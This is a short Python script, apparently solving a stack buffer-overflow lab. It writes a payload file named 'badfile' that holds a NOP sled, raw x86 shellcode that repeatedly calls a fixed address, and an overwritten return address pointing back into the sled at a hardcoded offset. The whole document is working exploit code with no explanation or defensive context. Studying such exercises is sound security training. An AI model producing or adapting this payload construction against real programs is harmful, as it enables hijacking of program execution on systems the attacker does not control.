function = b"\x31\xC0\x31\xC9\xBB\x86\x62\x55\x56\x41\x41\x41\x41\x41\x41\x40\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\x41\x41\x41\x41\x41\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\x41\x41\x41\x51\x50\xFF\xD3\x31\xC9\x41\x41\x51\x50\xFF\xD3"
distance = 855
# ret addr = 0x56556286
ebp_8 = 0xffffcda0
NOPs = 0x200
def p32(x):
    return x.to_bytes(4, "little")

total_ln= 1655

content = content = bytearray(0x90 for i in range(total_ln)) 

## shellcode at last:
shell_st =  total_ln - len(function)
content[shell_st : shell_st + len(function)] = function

ret_addr = ebp_8 + NOPs
offset = distance

L = 4

content[offset:offset+L] = p32(ret_addr)

with open("badfile", "wb") as f:
    f.write(content)

